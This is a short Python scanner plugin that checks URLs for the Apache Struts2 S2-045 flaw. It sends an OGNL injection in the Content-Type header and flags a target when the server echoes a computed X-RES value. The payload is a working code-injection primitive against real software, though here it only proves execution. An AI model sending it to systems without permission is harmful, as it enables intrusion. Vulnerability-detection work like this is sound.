#!/usr/bin/env python
# coding=utf-8
import requests
from report.report import save

pocname = "struts2-045"
headers = {'Content-Type': "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES',40765*42539)}.multipart/form-data",'User_Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}

def verify(arg, **kwargs):
	exploit = "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES',40765*42539)}.multipart/form-data"
	try:
		r = requests.get(url=arg,headers=headers,allow_redirects=False)
		#print(type(r.headers['x-res']))
		if "1734102335" in r.headers['x-res']:
			save(arg,pocname,exploit)
			return {"url": arg, "poc-name":pocname, "exploit": exploit}
	except Exception as e:
		pass